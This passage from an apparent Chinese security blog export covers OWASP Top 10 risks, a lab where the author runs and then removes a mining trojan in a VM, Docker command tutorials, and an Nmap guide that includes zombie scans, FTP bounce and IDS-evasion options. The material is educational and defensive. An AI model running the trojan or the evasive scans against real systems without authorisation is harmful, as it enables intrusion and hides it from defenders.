。将工作因素（延迟因素）设置在可接受范围。 单独验证每个安全配置项的有效性。 A4 XML外部实体（XXE）描述如果攻击者可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项或集成，他们就能够攻击含有缺陷的XML处理器。 检测默认情况下，许多旧的XML处理器能够对外部实体、 XML进程中被引用和评估的URI进行规范。 SAST工具可以通过检查依赖项和安全配置来发现XXE缺陷。DAST工具需要额外的手动步骤来检测和利用XXE缺陷。因为XXE漏洞测试在2017年并不常见， 因此手动测试人员需要通过接受培训来了解如何进行 XXE漏洞测试。 应用程序和特别是基于XML的Web服务或向下集成，可能在以下 方面容易受到攻击： 您的应用程序直接接受XML文件或者接受XML文件上传，特别来自不受信任源的文件，或者将不受信任的数据插入XML文件， 并提交给XML处理器解析。 在应用程序或基于Web服务的SOAP中，所有XML处理器都启用 了文档类型定义（DTDs） 如果为了实现安全性或单点登录（SSO），您的应用程序使用SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击。 如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传递到SOAP框架，那么它可能受到XXE攻击。 存在XXE缺陷的应用程序更容易受到拒绝服务攻击，包括： Billion Laughs攻击。 对业务的影响XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。 防范开发人员培训是识别和减少XXE缺陷的关键，此外，防止XXE缺陷还需要： 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高版本。 在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。 在服务器端实施积极的（“白名单”）输入验证、过滤和清理， 以防止在XML文档、标题或节点中出现恶意数据。 验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。 尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的最佳选择，但是SAST工具可以检测源代码中的XXE漏洞。 如果无法实现这些控制，请考虑使用虚拟修复程序、API安全网关或Web应用程序防火墙（WAF）来检测、监控和防止XXE攻击。 A5 失效的访问控制描述对访问控制的利用是渗透测试人员的 一项核心技能。SAST工具和DAST工具可以检测到访问控制的缺失，但不能验证其功能是否正常。访问控制可通过手动方式检测，或在某些特定框架下通过自动化检测访问控制缺失。 检测由于缺乏自动化的检测和应用程序开发人员缺乏有效 的功能测试，因而访问控制缺陷很常见。 访问控制检测通常不适用于自动化的静态或动态测试。 手动测试是检测访问控制缺失或失效的最佳方法，包括：HTTP方法（如：GET和PUT）、控制器、直接对象引用等。 访问控制强制实施策略，使用户无法在其预期的权限之外执行行为。失败的访问控制通常导致未经授权的信息泄露、修改或销毁所有数据、或在用户权限之外执行业务功能。 常见的访问控制脆弱点包括： 通过修改URL、内部应用程序状态或HTML页面绕过访问控制检查，或简单地使用自定义的API攻击工具。 允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。 特权提升。在不登录的情况下假扮用户，或以用户身份登录时充当管理员。 元数据操作，如重放或篡改JWT访问控制令牌，或作以提升权限的cookie或隐藏字段。 CORS配置错误允许未授权的API访问。 以未通过身份验证的用户身份强制浏览的通过身份验证时才能看到的页面、或作为标准用户访问具有相关权限的页面、或API没有对POST、PUT和DELETE强制执行访问控制。 对业务的影响技术影响是攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、访问、更新或删除任何记录。 防范访问控制只有在受信服务器端代码或没有服务器的API中有效，这样攻击者才无法修改访问控制检查或元数据。 除公有资源外，默认情况下拒绝访问。 使用一次性的访问控制机制，并在整个应用程序中不断重用它们，包括最小化CORS使用。 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、 读取、更新或删除的任何记录。 域访问控制对每个应用程序都是唯一的，但业务限制要求应由域模型强制执行。 禁用Web服务器目录列表，并确保文件元数据（如：git）不存在于Web的根目录中。 记录失败的访问控制，并在适当时向管理员告警（如：重复故障）。 对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害。 当用户注销后，服务器上的JWT令牌应失效。 A6 安全配置错误描述通常，攻击者能够通过未修复的漏洞、 访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解 检测安全配置错误可以发生在一个应用程序堆栈的任何层面，包括网络服务、平台、Web服务器、应用服务器、 数据库、框架、自定义代码和预安装的虚拟机、容器和存储。 自动扫描器可用于检测错误的安全配置、默认帐户的使用或配置、不必要的服务、遗留选项等。 您的应用程序可能受到攻击，如果应用程序是： 应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的权限配置错误。 应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、帐户或权限）。 默认帐户的密码仍然可用且没有更改。 错误处理机制向用户披露堆栈跟踪或其他大量错误信息。 对于更新的系统，禁用或不安全地配置最新的安全功能。 应用程序服务器、应用程序框架（如：Struts、Spring、 ASP.NET）、库文件、数据库等没有进行安全配置。 服务器不发送安全标头或指令，或者未对服务器进行安全配置。 您的应用软件已过期或易受攻击。 缺少一个体系的、可重复的应用程序安全配置过程，系统将处于高风险中。 对业务的影响这些漏洞使攻击者能经常访问一些未授权的系统数据或功能。有时，这些漏洞导致系统的完全攻破。 防范 一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。 开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。这个过程应该是自动化的，以尽量减少安装一个新安全环境的耗费。 搭建最小化平台，该平台不包含任何不必要的功能、组件、文档 和示例。移除或不安装不适用的功能和框架。 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分。在检查过程中，应特别注意云存储权限（如：S3桶权限）。 一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。 向客户端发送安全指令，如：安全标头。 在所有环境中能够进行正确安全配置和设置的自动化过程。 A7 跨站脚本（XSS）描述存在三种XSS类型，通常针对用户的浏览器： 反射式XSS：应用程序或API包括未经验证和未经转义的用户输入， 作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者 的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站， 广告或类似内容。 存储式XSS：你的应用或者API将未净化的用户输入存储下来了， 并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一般被认为是高危或严重的风险。 基于DOM的XSS：会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的来说，你应该避免将攻击者可控的数据发送给不安全的JavaScript API。 检测不同类型的xss漏洞的检测方法详见 http://blogs.loongeyes.cn/2018/07/29/WEB%E5%AE%89%E5%85%A8/ 对业务的影响XSS对于反射和DOM的影响是中等的，而对于存储的XSS，XSS的影响更为严重，譬如在受攻击者的浏览器上执行远程代码，例如：窃取凭证和会话或传递恶意软件等。 典型的XSS攻击可导致盗取session、账户、绕过MFA、DIV替换、 对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其 他用户侧的攻击。 防范防止XSS需要将不可信数据与动态的浏览器内容区分开。这可以 通过如下步骤实现： 使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0 或 React JS。了解每个框架的XSS保护的局限性，并适当地处 理未覆盖的用例。 为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、JavaScript、CSS或URL） 对所有不可信的HTTP请求数据进行恰当的转义 。 在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的 选择是实施上下文敏感数据编码。如果这种情况不能避免，可以采用类似上下文敏感的转义技术应用于浏览器API。 使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有效的。 A8 不安全的反序列化描述对反序列化的利用是有点困难的。因为在不更改或调整底层可被利用代码的情况下，现成的反序列化漏洞很难被使用。 检测在应用程序中，序列化可能被用于: 远程和进程间通信（RPC/IPC） 连线协议、Web服务、消息代理 缓存/持久性 • 数据库、缓存服务器、文件系统 HTTP cookie、HTML表单参数、API身份验证令牌 如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用 程序和API变的脆弱。 这可能导致两种主要类型的攻击： 如果应用中存在可以在反序列化过程中或者之后被改变行为的类， 则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我们将其称为对象和数据结构攻击。 典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。 对业务的影响反序列化缺陷的影响不能被低估。它们可能导致远程代码执行攻击，这是可能发生的最严重的攻击之一。 防范唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。 如果上述不可能的话，考虑使用下述方法： 执行完整性检查，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。 在创建对象之前强制执行严格的类型约束，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。 如果可能，隔离运行那些在低特权环境中反序列化的代码。 记录反序列化的例外情况和失败信息，如：传入的类型不是预期的类型，或者反序列处理引发的例外情况。 限制或监视来自于容器或服务器传入和传出的反序列化网络连接。 监控反序列化，当用户持续进行反序列化时，对用户进行警告。 A9 使用含有已知漏洞的组件描述对一些漏洞很容易找到其利用程序， 但对其它的漏洞则需要定制开发。 检测这种安全漏洞普遍存在。基于组件开发的模式使得多 数开发团队根本不了解其应用或API中使用的组件，更谈不上及时更新这些组件了。 如果满足下面的某个条件，那么你的应用就易受此类攻击： 如果你不知道所有使用的组件版本信息（包括：服务端和客户端）。这包括了直接使用的组件或其依赖的组件。 如果软件易受攻击，不再支持或者过时。这包括：OS、Web服务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、 API和所有的组件、运行环境和库。 如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。 如果你不基于风险并及时修复或升级底层平台、框架和依赖库。很可能发生这种情况：根据变更控制，每月或每季度进行升级， 这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。 如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼容性测试。 如果你没有对组件进行安全配置。 对业务的影响虽然对于一些已知的漏洞其影响很小， 但目前很多严重的安全事件都是利用 组件中的已知漏洞。根据你所要保护 的资产，此类风险等级可能会很高。 防范应该制定一个补丁管理流程： 移除不使用的依赖、不需要的功能、组件、文件和文档。 利用如 versions、DependencyCheck、retire.js等工具来持续的记录客户端和服务器端以及它们的依赖库的版本信息。持续监控 如CVE和NVD等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警 告邮件。 仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险 监控那些不再维护或者不发布安全补丁的库和组件。如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。 每个组织都应该制定相应的计划，对整个软件生命周期进行监控、 评审、升级或更改配置。 A10 不足的日志记录和监控描述对不足的日志记录及监控的利用几乎是每一个重大安全事件的温床。攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。 检测判断你是否有足够监控的一个策略是在渗透测试后检查日志。 测试者的活动应被充分的记录下来，能够反映出他们造成了什么样的影响。 下列情况会导致不足的日志记录、检测、监控和响应： 未记录可审计性事件，如：登录、登录失败和高额交易。 告警和错误事件未能产生或产生不足的和不清晰的日志信息。 没有利用应用系统和API的日志信息来监控可疑活动。 日志信息仅在本地存储。 没有定义合理的告警阈值和制定响应处理流程。 渗透测试和使用DAST工具（如：OWASP ZAP）扫描没有触发告警 对于实时或准实时的攻击，应用程序无法检测、处理和告警。 如果你的应用使得日志信息或告警信息对用户或者攻击者可见， 你就很容易遭受信息泄露攻击 对业务的影响多数成功的攻击往往从漏洞探测开始。 允许这种探测会将攻击成功的可能性提高到近100% 据统计，在2016年确定一起数据泄露事件平均需要花191天时间，这么长时间里损害早已发生。 防范根据应用程序存储或处理的数据的风险： 确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。 确保日志以一种能被集中日志管理解决方案使用的形式生成 确保高额交易有完整性控制的审计信息，以防止篡改或删除， 例如审计信息保存在只能进行记录增加的数据库表中。 建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。 建立或采取一个应急响应机制和恢复计划，例如：NIST 80061 rev 2或更新版本。 目前已有商业的和开源的应用程序防护框架（例如：OWASP AppSensor）、Web应用防火墙（例如 ：Modsecurity with the OWASP Core Rule Set）、带有自定义仪表盘和告警功能的日志关联软件。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[查杀'一路赚钱'木马]]></title>
    <url>%2F2018%2F08%2F06%2F%E6%89%8B%E5%B7%A5%E6%9D%80%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[手工杀马工具：iostat sar top chkrootkit rkhunter PC Hunter(windows 后门排查) 准备工作： 虚拟机的网络适配器选择NAT连接； 植入木马： 将mservice.sh的执行文件放在/目录下 执行木马脚本开始： sudo bash mservice.sh 55138 //55138为自己的一路挣钱ID号 查找木马1.通过查看top看到CPU占有197.7%（2个CPU） 2.通过lsof -p 51885查看xig的进程目录3.通过命令cat /etc/passwd发现了陌生用户 4.用iostat命令查看块设备运行状态 5.用netstat -anplt查看端口开放情况，发现了几个可疑的端口和对应的服务。 6.用crontab -l命令查看计划任务，发现了可疑状态。 7.在/opt中目录中新增了如下的可疑文件 查看这些文件的内容如下： 8.查看开机启动项systemctl list-unit-files | grep enable，发现YiluzhuanqianSer.service服务。 9.其他：（1）通过命令find . -type -f atime -3搜索最近3天内被访问过的所有文件 （2）history 查看命令历史。less .bash_history查看各用户命令记录。 （3）last查看最近登录用户。 (4) 查看日志 （5）检查lib库，检查/tmp/目录，检查alias别名 清除木马1.清除计划任务。crontab -r //清除计划任务 2.关掉可疑的开机自启服务YiluzhuanqianSer.service 3.查看进程，杀死可疑的服务进程ps aux kill -9 51877 4.删除可以的文件和目录清除木马文件权限（权限设置为000），然后删除 5.reboot 重启 检测已经清除木马CUP运行正常： 端口开放正常： 一路赚钱后台212的IP已经离线： 参考文献： https://www.jianshu.com/p/26d1567c4d0b https://wenku.baidu.com/view/d9c72c596c85ec3a86c2c54e.html]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker容器]]></title>
    <url>%2F2018%2F08%2F01%2FDocker%E5%AE%B9%E5%99%A8%2F</url>
    <content type="text"><![CDATA[创建容器新建容器123docker create -it ubuntu:latestdocker ps -a 此命令新建一个容器，处于停止状态 启动容器1docker start container_id 启动一个已经创建的容器 新建并启动容器1234docker run -it name:tag /bin/bash-i：保持标准输入打开-t: 分配一个伪终端 相当于先执行docker create命令，再执行docker start命令 当使用docker run来创建并启动容器时，Docker在后台运行的标准操作包括： ​ 1.检查本地是否存在本地镜像，不存在就从公有仓库下载 ​ 2.利用镜像创建一个容器，并启动该容器 ​ 3.分配一个文件系统给容器，并在只读的镜像层外面挂载一层可读写层 ​ 4.从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中 ​ 5.从网桥的地址池中配置一个IP地址给容器 ​ 6.执行用户指定的应用程序 ​ 7.执行完毕后容器被自动终止 守护态运行1234docker run -d name:tag /bin/bash -c &quot;&quot;-d:守护态运行-c：执行动作 返回容器唯一id 1docker logs container_id 指定容器id来获取容器的输出信息 终止容器123docker stop [-t] container_id-t:设置延迟时间，默认10秒 ​ 首先向容器发送SIGTERM信号，等待延时时间后，再发送SIGKILL信号终止容器。 1docker kill container_id ​ 直接向容器发送SIGKILL信号来终止容器 当Docker中指定的应用终结时，容器也会自动终止，处于Exited状态 启动终止状态的容器 1docker start container_id 重启容器 1docker restart container_id 进入容器对于守护态运行的容器而言 attach命令12345docker attach [--detach-keys[=[]]] [--on-stdin] [--sig-proxy[=true]] container_id--detach-keys[=[]]:指定退出attach模式的快捷键序列--on-stdin:是否关闭标准输入，默认打开--sig-proxy=true|false：是否代理收到的系统信号给应用进程，默认为true 当多个窗口同时使用attach命令连到同一个容器时，所有窗口同步显示。 exec命令(推荐)12345678docker exec [option] container_id COMMAND-i，--interactive=true|false:打开标准输入接收用户指令，默认false--privileged=true|false：是否执行命令以最高权限，默认为false-t，--tty=true|false：分配伪终端，默认为false-u，--user=&quot;&quot;：执行命令的用户名或IDdocker exec -it container_id /bin/bash nsenter工具使用nsenter连接到容器，需要找到容器进程的PID 1PID=$(docker inspect -f &quot;&#123;&#123; .State.Pid &#125;&#125;&quot; container_id) 连接容器 1nsenter --target $PID --mount --uts --ipc --net --pid 举例 删除容器删除处于终止或退出状态的容器 12345docker rm [option] container_id...-f,--force-false:是否强行终止并删除一个运行中的容器-l,--link=false:删除容器的连接，但保留容器-v,--volumes=false:删除容器挂载的数据卷 导入和导出容器导入容器导出一个已创建的容器到一个文件，无论此容器是否处于运行状态 123456docker export [-o|--output[=&quot;&quot;]] container_id-o,--output:指定导出的tar文件名docker export -o a.tar ce5docker export ce5 &gt; a.tar 导入容器12345docker import [-c|--change[=[]]] [-m|--message[=MESSAGE]] file|URL|- [NAME[:TAG]]-c,--change=[]:导入的同时执行对容器进行修改的Dockerfile指令docker import a.tar test/ubuntu:v1 ​ 实际上，既可以使用docker load命令导入镜像存储文件到本地镜像库，也可以使用docker import命令来导入一个容器快照到本地镜像库 ​ 两者的区别在于容器快照文件将丢失所有的历史纪录和元数据信息，用户可重新指定标签等元数据信息。而镜像存储文件将保存完整的记录。体积也更大。]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker镜像]]></title>
    <url>%2F2018%2F08%2F01%2FDocker%E9%95%9C%E5%83%8F%2F</url>
    <content type="text"><![CDATA[获取镜像从官方Docker Hub获取镜像123docker pull NAME:[TAG] #镜像名称：标签（默认latest标签）docker pull ubuntu:14.04 镜像文件一般有若干层（layer）组成。当不同的镜像包含相同的层时，本地仅存储一份，减小需要的存储空间。 从非官方仓库获取镜像123docker pull registry/name:[tag]docker pull hub.c.163.com/public/ubuntu:14.04 需指定注册服务器作为前缀 查看镜像信息使用images命令列出镜像1docker images REPOSITORY：来自于哪个仓库 TAG：标签 IMAGE ID：镜像ID号，唯一镜像标识符 CREATED：镜像最后更新时间 SIZE：镜像逻辑大小 使用tag命令添加镜像标签123docker tag old_name:old_tag new_name:new_tagdocker tag ubuntu:latest my:test tag命令添加的标签起到了类似链接的作用 使用inspect命令查看镜像详细信息1docker inspect name:tag 返回JSON格式的信息 使用history命令查看镜像历史1docker history name:tag 返回指定镜像各层的创建信息 搜寻镜像123456docker search TERM--automated=true|false:显示自动创建的镜像，默认为否--no-trunc=true|false:输出信息不截断显示，默认为否-s，--stars=X：仅显示评价为指定星级以上的镜像，默认为0，即输出所有镜像docker search --automated -s 3 nginx 默认输出结果按星级评价排序 删除镜像使用标签删除镜像1docker rmi IMAGE [IMAGE...] #IMAGE可以为名称+标签或id 当同一个镜像（id号相同）拥有多个标签时，rmi命令只会删除该镜像多个标签中的指定标签，不影响镜像文件 当一个镜像只有一个标签时，此命令指定标签时会彻底删除镜像 使用镜像ID删除镜像当使用docker rmi命令时，指定镜像ID号，会先尝试删除所有指向该镜像的标签，然后再删除镜像本身。 当该镜像创建的容器存在时，镜像文件默认是无法删除的，可使用 -f 参数强制删除镜像 创建镜像基于已有镜像的容器创建1234567docker commit [OPTIONS] CONTAINER [REPOSITORY:[TAG]]-a,--author=&quot;&quot;:指定此新建镜像的作者信息-c,--change=[]:提交的时候执行Dockerfile指令，包括CMD|ENTRYPOINT|ENV|EXPOSE|LABEL|ONBUILD|USER|VOLUME|WORKDIR-m,--message=&quot;&quot;:提交消息-p,--pause=true:提交时暂停容器运行docker commit -m &quot;add&quot; -a &quot;my&quot; container_id new_image_name:new_image_tag 返回新创建的镜像的ID信息 基于本地模板导入123docker import [OPTIONS] file|URL|- [REPOSITORY:[TAG]]cat ubuntu-14.04.tar.gz | docker import - ubuntu:14.04 OpenVZ模板下载地址：https://download.openvz.org/template/precreated 存出和载入镜像存出镜像123docker save -o FILE image:tagdocker save -o ubuntu_14.04.tar ubuntu:14.04 导出镜像到本地文件 载入镜像12345docker load --input FILEdocker load &lt; FILEdocker load --input ubuntu_14.04.tardocker load &lt; ubuntu_14.04.tar 将导入镜像及其相关的元数据信息（包括标签等） 上传镜像1234docker push name:[tag] | [REGISTRY_HOST:[REGISTRY_PORT]/]NAME:[TAG]docker tag test:latest user/test:latestdocker push user/test:latest 注册Docker Hub网站账号才可上传自制镜像，将标签修改为用户名/镜像名：标签 首次上传时，会验证登陆信息]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap使用]]></title>
    <url>%2F2018%2F08%2F01%2FNmap%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Nmap简介网络连接端扫描软件，用于主机发现，端口扫描，服务识别，系统识别。支持大量脚本 主机发现二层主机发现协议：ARP协议 优点：扫描速度快，可靠 缺点：不可路由 12nmap -sn 192.168.1.0/24-sn:ping扫描，禁用端口扫描，不仅发arp包，还会做ptr记录解析（反向域名解析） 三层主机发现协议：IP协议，ICMP协议 优点：可路由 缺点：较二层速度较慢，可被边界防火墙过滤 12nmap -sn 192.168.1.0/24-sn:不做端口扫描，ping扫描 四层主机发现协议：TCP协议，UDP协议 优点：可路由且可靠，不太可能被防火墙过滤，甚至可以发现所有端口都被过滤的主机 缺点：基于状态过滤的防火墙可能会过滤扫描，全端口扫描扫描速度慢 TCP主机发现方法： 未经请求的ACK(直接发一个ACK)，活着的主机会回一个RST包；宕机主机不会回包 直接发一个SYN包，活着的主机会回一个SYN/ACK包(端口打开)，回RST(端口关闭)； UDP主机发现方法： 如果目标主机不在线，不回包；如果目标端口开启，也可能不回包。无法判断目标主机是否存活 当主机在线，发包到其未开放的端口，会回应ICMP端口不可达，则表明其主机在线 端口扫描端口扫描即发现攻击点，发现开放端口 TCP端口扫描全连接扫描建立完整TCP三次连接，结果最最准确不需要任何权限，系统中的任何用户都有权利使用这个调用，而且速度快，但容易被发觉。 1nmap -sT 192.168.1.115 -p 100-200 隐蔽扫描不建立完整的TCP连接，不在应用层留痕，只能在网络层有些迹像可循 只发送SYN包，根据目标主机返回包判断目标端口是否开放，（返回SYN+ACK为端口开放，返回RST+ACK包为端口不开放） 12nmap 192.168.1.115 -p100-200 #nmap默认SYN端口扫描 -sSnmap -sS 192.168.1.115 -p100-200,445,3389 --open 僵尸扫描僵尸机选择条件： 可实现源地址伪造 足够闲置 IPID递增 123nmap -p445 192.168.1.133 --script=ipidseq.nse #发现僵尸机nmap 172.16.36.135 -sI 172.16.36.134 -Pn -p 0-100 -sI：指定僵尸机 -Pn：跳过主机发现，默认主机在线，做端口扫描 UDP端口扫描123nmap -iL iplist.txt -sU -p 1-200-iL：调用IP列表文件，批量IP扫描-sU：UDP扫描 服务扫描获取banner信息1nmap -sT 192.168.1.107 -p 22 --script=banner.nse 服务识别1nmap 192.168.1.107 -p1-100 -sV 操作系统识别TTL起始值： Windows系统：128（65-128） Linux/Unix：64（1-64） 某些Unix为255 1nmap -O 192.168.1.1 NMAP全部参数目标选择调用主机IP地址/网络的列表文件 1-iL &lt;inputfilename&gt; 选择随机目标 1-iR &lt;num hosts&gt; 排除主机/网络 1--exclude &lt;host1[,host2][,host3],...&gt; 排除主机IP地址/网络的列表文件 1--excludefile &lt;exclude_file&gt; 主机发现列表扫描——简单地列出要扫描的目标 1-sL Ping扫描-禁用端口扫描 1-sn 将所有主机视为在线——跳过主机发现 1-Pn TCP SYN Ping扫描 1-PS [portlist] TCP ACK Ping扫描 1-PA [portlist] UDP Ping扫描 1-PU [portlist] SCTP扫描 1-PY [portlist] ICMP type 8 (Ping)扫描 1-PE ICMP type 14 (时间戳响应)扫描 1-PP ICMP type 18(地址掩码响应)扫描 1-PM IP协议Ping扫描(禁止主机发现使Nmap对每一个指定的目标IP地址进行所要求的扫描 )(无Ping) 1-PO [protocol list] 不对IP地址做反向域名解析 1-n 永远对IP地址做反向域名解析 1-R 指定自定义DNS服务器 1--dns-servers &lt;serv1[,serv2],...&gt; 使用操作系统的DNS解析器 1--system-dns 每个主机跟踪路由跳转路径 1--traceroute 端口扫描nmap所识别的端口状态 open(开放的) 应用程序正在该端口接收TCP连接或者UDP报文。发现这一点常常是端口扫描的主要目标。 closed(关闭的) 关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)，但没有应用程序在其上监听。它们可以显示该IP地址上(主机发现，或者ping扫描)的主机正在运行,也对部分操作系统探测有所帮助。 filtered(被过滤的) 由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。 unfiltered(未被过滤的) 未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定端口是否开放。 open|filtered(开放或者被过滤的) 当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成这种状态。开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议，FIN，Null，和Xmas扫描可能把端口归入此类。 closed|filtered(关闭或者被过滤的) 该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。 TCP SYN隐蔽端口扫描 1-sS TCP全连接端口扫描 1-sT TCP ACK端口扫描 1-sA TCP窗口扫描 通过检查返回的RST报文的TCP窗口域。在某些系统上，开放端口用正数表示窗口大小(甚至对于RST报文) 而关闭端口的窗口大小为0。因此，当收到RST时，窗口扫描不总是把端口标记为unfiltered， 而是根据TCP窗口值是正数还是0，分别把端口标记为open或者closed 1-sW TCP Maimon扫描 根据RFC 793 (TCP)，无论端口开放或者关闭，都应该对FIN+ACK的探测响应RST报文。然而，如果端口开放，许多基于BSD的系统只是丢弃该探测报文 1-sM UDP端口扫描 1-sU TCP Null扫描(不设置任何TCP标志位) 1-sN TCP FIN扫描(只设置TCP FIN标志位) 1-sF TCP Xmas扫描(设置TCP FIN,PSH,URG标志位) 1-sX 自定义TCP标志位用于扫描 1--scanflags &lt;flags&gt; 指定僵尸机 1-sI &lt;zombie host[:probeport]&gt; SCTP初始化扫描 1-sY cookie-echo扫描 1-sZ IP协议扫描(用于确定目标机支持哪些IP协议 ) 1-sO FTP反弹扫描 代理ftp连接。它允许用户连接到一台FTP服务器，然后要求此FTP服务器将文件送到一台第三方服务器 可导致FTP服务器对其它主机端口扫描。只要请求FTP服务器轮流发送一个文件到目标主机上的所感兴趣的端口。错误消息会描述端口是开放还是关闭的。 1-b &lt;username&gt;:&lt;password&gt;@&lt;server&gt;:&lt;port&gt; #指定支持代理ftp连接功能的ftp服务器 端口规范和扫描顺序指定端口(Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9) 1-p &lt;port ranges&gt; 从扫描中排除指定的端口 1--exclude-ports &lt;port ranges&gt; 快速模式-扫描比默认扫描更少的端口 (在nmap-services文件中指定端口) 1-F 连续扫描端口——不要随机化 1-r 扫描最常见的端口 1--top-ports &lt;number&gt; 扫描更常见的端口 1--port-ratio &lt;ratio&gt; 服务/版本检测探测打开端口以确定服务/版本信息 1-sV 版本探测强度(0-9) 1--version-intensity &lt;level&gt; 限制探测强度为2 1--version-light 尝试每一种探测，强度9 1--version-all 显示详细的版本扫描活动（用于调试） 1--version-trace 脚本扫描1-sC: 等价于 --script=default 调用脚本(多个脚本以逗号隔开) 1--script=&lt;Lua scripts&gt; 提供脚本的参数 1--script-args=&lt;n1=v1,[n2=v2,...]&gt; 在文件中提供脚本参数 1--script-args-file=filename 显示发送和接收的所有数据 1--script-trace 更新脚本数据库 1--script-updatedb 查看脚本帮助信息 1--script-help=&lt;Lua scripts&gt; 操作系统检测检测操作系统 1-O 针对指定的目标进行操作系统检测 1--osscan-limit 推测操作系统检测结果 (默认) 1--osscan-guess 时间和性能默认时间选项为秒，可附加ms（毫秒），s（秒），m（分钟），h（小时） 设置定时模板 6个时间模板，使用时采用-T选项及数字(0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)。 前两种模式用于IDS躲避 Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。 默认模式为Normal，因此-T3 实际上是未做任何优化。 Aggressive模式假设用户具有合适及可靠的网络从而加速扫描。 Insane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。 1-T &lt;0-5&gt; 并行主机扫描组大小 12--min-hostgroup &lt;milliseconds&gt;--max-hostgroup &lt;milliseconds&gt; 调整探测报文的并行度 12--min-parallelism &lt;milliseconds&gt;--max-parallelism &lt;milliseconds&gt; 调整探测报文超时时间 123--min-rtt-timeout &lt;milliseconds&gt;--max-rtt-timeout &lt;milliseconds&gt;--initial-rtt-timeout &lt;milliseconds&gt; 端口扫描探测重传上限 1--max-retries &lt;tries&gt; 放弃目标时间 1--host-timeout &lt;time&gt; 调整探测之间的延迟 12--scan-delay &lt;time&gt;--max-scan-delay &lt;time&gt; 设置发送数据包的速度 12--min-rate &lt;number&gt;--max-rate &lt;number&gt; 防火墙/ IDS逃避和欺骗报文分段，指定MTU 12-f--mtu &lt;val&gt; 使用诱饵隐蔽扫描 